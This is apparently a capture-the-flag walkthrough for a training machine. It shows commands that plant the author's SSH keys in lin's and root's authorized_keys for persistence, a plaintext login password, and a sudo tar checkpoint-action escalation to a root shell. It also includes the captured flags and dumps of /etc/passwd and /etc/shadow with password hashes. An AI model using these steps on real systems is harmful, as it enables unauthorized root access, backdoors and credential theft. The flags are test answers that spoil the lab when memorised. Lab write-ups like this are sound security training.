### New Usable SSH Pub Keys

> add to ~/.ssh/authorized_keys


User lin
```
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCrl2iCPfw3KhV0nqluafDLrdO/8BBK029XaCtq2tPS/pcwetuVDK3Vb6+AE4hO5OXJwYj8/QJVB56+o6HQ4vYFDypp4h3q27V7vKefwmVi+TzTBIzSmyFCOFHNFp4FCTHZLbu1S4sCY7GZH9cFPL27qjOscvr+ns5a9X6oEyVDdzLboOelLb4chkHJTnK1WUpawqThG8rA2pWw7274ZmOFjR64/oaSjSuhOGC/f0akf4X9ed9cD93vQnpkb99agkfpCGyI11fUW24t4HCxBXTVoQFM2CDjrv4QLnC4mqS+wqNf49VOXSDclCtTeVBkEAq5CHRVCug4atIannb46+6l7nepyi6OiyAiC3ZB/WTtZSBZG4dHqgerKgxOxmy4vS+H/qRYAmlu2NJgEEpnhe7EDaQV7q6UREcZprxSUC1Z5RbIlSXQJIBe/Viuj6XZMkHNbNznHbw5Z58WwakK2MVyI/D6CfqbnFSnjvYaior6ziKdmMy/0TCMeoqoRJ6F69Flrr8bQDdgLkhnYPfUos4uKwxUVlSJRgYgtRW41A/sP9qNp2Bw3nDCrxb9czqsGCvCgWhnY1fv1klDk+gMmFlXenWSU3DnvynOHGo8u0p51d9RHF1MT6lbGseNa74Z62COeXov05X6Oy3sZHTG9/f8VSAHLtAZIbRlghcdHv+lAw== your_email@example.com" >> /home/lin/.ssh/authorized_keys

```

Root
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAADLyNQqfepmBc0WQCHZtlKG3Dn63YAgswpHAB4ci+1RSKWxIoOduGO2XPVv+1+VaQ6krlKRYrEvZZFfmgRZylLss5yU40ajySZr12vzeg4ogAH7snW/jLhPrrsMDm2H9c/w5NqjAMx+yp1eyzO2k8E8HqLd/aKUxbkLSYIk44CkVyCwenGosWjBWVpm+C+AU0ja74WxUgjxYy6CEJ818wu2s50lUM/UFV4F3BZQUoOoi4iOEgxonR+2asUhMUVAiJMYK5k92AZXxKhUj4RaNCfLJ/OoidFpvFax2qNLBSSDnoklGMDQgmOXl/eWjZMqwsAY26WlUd0yML7+tKx7gh9HzAk4qMmrxk1buYk2eBx2LgAfoY+hhg4ClKMPmKZ2zbhjiExH+Rj51JHwCxYJ7Qy6o+QZmc0gMC+5EbzmDkEa2Pi5meu6tKx9Zxx2DRZgQL0uOd3ksVHIIGcV5NVxlIP99tbayqEUKDNITUKStlc5T4iy36V7J9cK+3Gb9/PQLjliDpxZv80vAkHUTdMRjikHgiAB7rQIKuX3gXGSkz9d9GKd67I8Jn9dO0ETWkfzac+zA6zcXzrh2h8S02aIQok2G7YJ++O1fyX71dDvj1UyGPTPs6MXAiIw1DlQuhlMt3yhFmDQRWGPxm9M+m+1P2k7fSch6/N/U7qMPC3Dpww== your_email@example.com" >> /root/.ssh/authorized_keys
```


logging into ssh

```
ssh lin@10.10.188.195
RedDr4gonSynd1cat3
```


```
lin@10.10.188.195's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ whoami
lin
lin@bountyhacker:~/Desktop$ uname -a
Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$
```

user.txt
```
find / -type f -name "*user.txt*" 2>/dev/null
```

```
/home/lin/Desktop/user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

GTFO Bins for tar

https://gtfobins.github.io/gtfobins/tar/#sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# whoami
root
root@bountyhacker:~/Desktop# uname -a
Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@bountyhacker:~/Desktop# sudo -l
Matching Defaults entries for root on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on bountyhacker:
    (ALL : ALL) ALL
root@bountyhacker:~/Desktop#
```

root.txt
```
THM{80UN7Y_h4cK3r}
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
ftp:x:121:129:ftp daemon,,,:/srv/ftp:/bin/false
lin:x:1001:1001:Lin,,,:/home/lin:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```

/etc/shadow
```
root:$6$CIGJ0Sgt$OlKACZeDlAdF1NZUaWUAUY6DDj.X27a2erTfqgRmpFiVZe6GXWtIzDj.WVFxCyCW6joATNEBxljZwAQ9DoFdZ.:18420:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:17954:0:99999:7:::
uuidd:*:17954:0:99999:7:::
lightdm:*:17954:0:99999:7:::
whoopsie:*:17954:0:99999:7:::
avahi-autoipd:*:17954:0:99999:7:::
avahi:*:17954:0:99999:7:::
dnsmasq:*:17954:0:99999:7:::
colord:*:17954:0:99999:7:::
speech-dispatcher:!:17954:0:99999:7:::
hplip:*:17954:0:99999:7:::
kernoops:*:17954:0:99999:7:::
pulse:*:17954:0:99999:7:::
rtkit:*:17954:0:99999:7:::
saned:*:17954:0:99999:7:::
usbmux:*:17954:0:99999:7:::
ftp:*:18420:0:99999:7:::
lin:$6$iAdO55BsDuqY/lHq$sPxF8jcQHAsTphZ3V5hmwQV6cE23Ade3n.lK4LdDJfBQM4Pi3FkxMSYh1xx5DxUmhbJfbxlldG9o5VfWxBI2y0:18420:0:99999:7:::
sshd:*:18420:0:99999:7:::
```